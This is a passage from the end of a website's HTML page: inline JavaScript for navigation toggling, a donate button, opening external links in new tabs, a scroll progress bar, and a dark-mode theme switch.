      document.getElementById("nav-content").classList.toggle("hidden");
    };

    var donate = document.getElementById("btn-donate");
    if (donate) {
      donate.onclick = function() {
        document.getElementById("donate-image").classList.remove("hidden");
        donate.classList.add("hidden");
      };
    }

    var hostname = window.location.hostname;
    var divs = document.querySelectorAll('a[href^="http"]');
    [].forEach.call(divs, function(div) {
      url = div.getAttribute("href");
      var domain = url
        .replace("http://", "")
        .replace("https://", "")
        .split(/[/?#:]/)[0];
      if (domain !== hostname) {
        div.setAttribute("target", "_blank");
      }
    });
  };

   
  
  var h = document.documentElement,
    b = document.body,
    st = "scrollTop",
    sh = "scrollHeight",
    progress = document.querySelector("#progress"),
    scroll;
  var scrollpos = window.scrollY;
  var header = document.getElementById("header");
  var navcontent = document.getElementById("nav-content");

  document.addEventListener("scroll", function() {
     
    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
    progress.style.setProperty("--scroll", scroll + "%");

     
    scrollpos = window.scrollY;

    if (scrollpos > 10) {
      navcontent.classList.remove("bg-gray-100");
    } else {
      navcontent.classList.add("bg-gray-100");
    }
  });

  
  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
      var lightIcon = document.getElementById("light-icon");
      var darkIcon = document.getElementById("dark-icon"); 
      lightIcon.classList.add("hidden");
      darkIcon.classList.remove("hidden");
      document.querySelector('html').classList.add('dark')
  }

  document.getElementById('switchTheme').addEventListener('click', function() {
    let htmlClasses = document.querySelector('html').classList;
    var lightIcon = document.getElementById("light-icon");
    var darkIcon = document.getElementById("dark-icon");
    if(localStorage.theme == 'dark') {
        htmlClasses.remove('dark');
        localStorage.removeItem('theme');
        darkIcon.classList.add("hidden");
        lightIcon.classList.remove("hidden");
    } else {
        htmlClasses.add('dark');
        lightIcon.classList.add("hidden");
        darkIcon.classList.remove("hidden");
        localStorage.theme = 'dark';
    }
  });
</script>

</body>

</html>